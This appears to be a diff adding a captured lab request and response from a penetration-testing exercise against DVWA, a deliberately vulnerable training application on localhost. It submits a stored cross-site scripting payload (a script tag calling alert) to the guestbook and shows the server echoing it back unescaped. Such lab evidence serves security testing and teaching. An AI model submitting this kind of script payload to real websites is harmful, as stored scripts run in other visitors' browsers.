@@ -1,0 +1,12 @@
+POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=<REDACTED_LAB_SESSION>; security=low
+
+txtName=VAPT&mtxMessage=%3Cscript%3Ealert%28%27XSS-S%27%29%3C%2Fscript%3E&btnSign=Sign+Guestbook
+
+=== RESPONSE ===
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+
+<div id="guestbook_comments">Name: VAPT<br />Message: <script>alert('XSS-S')</script><br /></div>
